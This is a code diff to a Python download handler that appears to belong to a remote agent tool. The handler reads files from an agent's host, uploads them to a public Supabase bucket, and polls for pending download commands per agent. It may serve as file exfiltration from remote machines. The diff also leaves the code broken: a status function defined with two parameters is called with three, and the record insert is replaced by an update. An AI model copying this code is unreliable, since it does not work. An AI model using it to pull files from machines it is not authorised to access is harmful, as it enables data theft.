@@ -13,11 +13,11 @@ def handle_download_command(command_text, username, agent_id, hostname):
 
         # Input validation for the file path
         if not os.path.exists(file_path):
-            update_command_status(command_text, "Failed", f"File does not exist: {file_path}")
+            update_download_status(command_text, "Failed", f"File does not exist: {file_path}")
             return "Failed", f"File does not exist: {file_path}"
 
         if os.path.isdir(file_path):
-            update_command_status(command_text, "Failed", f"Invalid path, it is a directory: {file_path}")
+            update_download_status(command_text, "Failed", f"Invalid path, it is a directory: {file_path}")
             return "Failed", f"Invalid path, it is a directory: {file_path}"
 
         # Determine the mimetype of the file
@@ -40,7 +40,7 @@ def handle_download_command(command_text, username, agent_id, hostname):
             file_url = get_public_url(bucket_name, storage_path)
 
             # Insert download record into the database
-            with_retries(lambda: supabase.table("downloads").insert({
+            with_retries(lambda: supabase.table("downloads").update({
                 "agent_id": agent_id,
                 "hostname": hostname,
                 "local_path": file_path,
@@ -48,32 +48,27 @@ def handle_download_command(command_text, username, agent_id, hostname):
                 "file_url": file_url,
                 "username": username,
                 "status": "Completed"
-            }).execute())
-
-            # Update the py2 table to mark the command as completed with output
-            update_command_status(command_text, "Completed", f"File uploaded and available at {file_url}")
+            }).eq('local_path', file_path).execute())
 
             return "Completed", f"File uploaded and available at {file_url}"
 
         else:
             error_message = response.json().get("error", {}).get("message", "Unknown error")
-            update_command_status(command_text, "Failed", f"Upload failed: {error_message}")
+            update_download_status(command_text, "Failed", f"Upload failed: {error_message}")
             return "Failed", f"Upload failed: {error_message}"
     except Exception as e:
-        update_command_status(command_text, "Failed", str(e))
+        update_download_status(command_text, "Failed", str(e))
         return "Failed", f"An unexpected error occurred: {str(e)}"
 
 def get_public_url(bucket_name, file_path):
     """Constructs the public URL for a file in Supabase storage."""
     return f"https://{SUPABASE_URL.split('//')[1]}/storage/v1/object/public/{bucket_name}/{file_path}"
 
-def update_command_status(command_text, status, output=None):
-    """Update the status of a command in the py2 table."""
+def update_download_status(command_text, status):
+    """Update the status of a command in the downloads table."""
     try:
         data = {"status": status}
-        if output:
-            data["output"] = output
-        with_retries(lambda: supabase.table("py2").update(data).eq("command", command_text).execute())
+        with_retries(lambda: supabase.table("downloads").update(data).eq("local_path", command_text.split(maxsplit=1)[1]).execute())
     except Exception as e:
         print(f"Failed to update command status: {str(e)}")
 
@@ -138,3 +133,8 @@ def handle_upload_command(command_text, username, agent_id):
 
     except Exception as e:
         return "Failed", f"An unexpected error occurred: {str(e)}"
+
+def check_for_pending_downloads(agent_id):
+    """Fetches pending downloads from the 'downloads' table."""
+    response = with_retries(lambda: supabase.table("downloads").select("*").eq("status", "Pending").eq("agent_id", agent_id).execute())
+    return response.data if response.data else None
